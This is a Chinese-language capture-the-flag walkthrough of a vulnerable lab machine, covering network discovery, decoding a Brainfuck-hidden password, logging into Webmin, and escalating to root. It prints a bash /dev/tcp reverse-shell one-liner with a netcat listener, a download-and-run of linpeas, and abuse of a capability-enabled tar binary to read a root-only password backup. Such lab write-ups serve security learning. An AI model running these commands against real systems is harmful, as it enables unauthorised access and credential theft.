1. `sudo netdiscover -i eth0`
![image](https://hackmd.io/_uploads/HJmz99gwlg.png)
2. `curl http://192.168.163.131`
    > ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
--> 
    >
    - 發現原始碼最後面有一串很像 Brainfuck 加密過的文字
3. 使用[線上解碼工具](https://www.dcode.fr/brainfuck-language)
![image](https://hackmd.io/_uploads/HJm_Gilveg.png)
    - .2uqPEfj3D<P'a-3
4. `nmap -sV 192.168.163.131`
![image](https://hackmd.io/_uploads/SJhQ9qxPee.png)
    - 139/tcp & 445/tcp: Samba 服務
    - 10000/tcp & 20000/tcp: Webmin 服務，這是網頁介面的系統管理工具
5. `enum4linux -a 192.168.163.131`
![image](https://hackmd.io/_uploads/H1fJBjxvxe.png)
    - 表示系統上存在一個名為 cyber 的使用者
6. `https://192.168.163.131:20000`
![image](https://hackmd.io/_uploads/B1EJv2xDex.png)
    - 帳號 : cyber
    - 密碼 : .2uqPEfj3D<P'a-3 
7. 進入頁面
![image](https://hackmd.io/_uploads/BJefr2sevlg.png)
8. 找到執行指令的地方
![image](https://hackmd.io/_uploads/B1rra3lDlg.png)
`nc -lvnp 4444`  先在攻擊端監聽
`bash -c 'bash -i >& /dev/tcp/192.168.163.128/4444 0>&1'` 在 command shell 輸入並執行
9. 反彈 shell
![image](https://hackmd.io/_uploads/Hk-Z03ewxg.png)
    - 拿到第一個 flag
    - 3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
10. `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 chmod +x linpeas_linux_amd64 ./linpeas_linux_amd64`
    - linpeas 掃描
11. 找到兩個提權線索
![image](https://hackmd.io/_uploads/SyLfSalPle.png)
- 家目錄 /home/cyber/ 下有一個 tar 執行檔，它被授予了 cap_dac_read_search 權限。這意味著使用這個特定的 tar 程式可以繞過檔案權限檢查，讀取系統上任何檔案的內容，即使是 root 擁有的檔案
![image](https://hackmd.io/_uploads/B1ggB6ePlx.png)
- 在 /var/backups/ 目錄下有一個隱藏的、只有 root 可讀的檔案 .old_pass.bak。檔名暗示它可能包含舊的密碼
12. `cd /home/cyber`
13. `./tar -cf - /var/backups/.old_pass.bak`
![image](https://hackmd.io/_uploads/SJz_hplPgl.png)
    - `./tar` : 執行您家目錄下這個有特殊權限的 tar
    - `-c` : 建立 (create) 一個新的存檔
    - `-f -` : 將存檔的輸出指定到標準輸出 (stdout)，也就是您的螢幕，而不是一個檔案
    - `/var/backups/.old_pass.bak` : 想要讀取的目標檔案
    - 得到密碼 `Ts&4&YurgtRX(=~h `
14. `su root`
![image](https://hackmd.io/_uploads/H1Zga6eDel.png)
15. `cat rOOt.txt`
![image](https://hackmd.io/_uploads/Hylzp6xwxe.png)
    - 拿到最後一個 flag !
    - 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
